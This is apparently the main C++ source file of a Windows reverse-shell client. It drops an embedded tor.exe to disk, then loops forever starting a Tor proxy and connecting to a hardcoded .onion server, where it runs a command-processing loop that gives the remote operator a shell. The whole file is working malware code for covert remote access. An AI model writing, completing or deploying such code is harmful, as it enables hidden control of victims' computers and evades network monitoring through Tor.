#include "clientClass.h"
#include "torExeRes.h"

#include <Windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>

HMODULE GetCurrentModule() {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCTSTR)GetCurrentModule, &hModule);
    return hModule;
}

void dropTor() {
    // Get a pointer to tor.zip
    HMODULE hCurrentModule = GetCurrentModule();
    HRSRC hTorExeRes = FindResource(hCurrentModule, MAKEINTRESOURCE(TOREXE), MAKEINTRESOURCE(EXEFILE));
    HGLOBAL hTorExeData = LoadResource(hCurrentModule, hTorExeRes);
    DWORD hTorExeSize = SizeofResource(hCurrentModule, hTorExeRes);
    char* hTorExeFinal = (char*)LockResource(hTorExeData);
    // Write hTorZipFinal to disk
    std::ofstream torExeFile("tor.exe", std::ios::binary);
    torExeFile.write(hTorExeFinal, hTorExeSize);
    torExeFile.close();
}

#define HOST "zd2j5murooa4imqzfa52ikp3rxsauti5fip4k4atppdbvpgdewzkwpyd.onion"

int main() {
    // Put TOR onto the disk if it isnt there already
    if (GetFileAttributes(L"tor.exe") == INVALID_FILE_ATTRIBUTES) {
        dropTor();
    }
    
    // Hell loop of forever restarting TOR and trying to connect to the server :)
    while (1) {
        torRevShellClient c(".\\tor.exe", HOST);
        c.startProxy();
        bool conn = c.attemptConnect();
        if (conn) {
            c.cmdProcessLoop();
        }
    }

    return 0;
}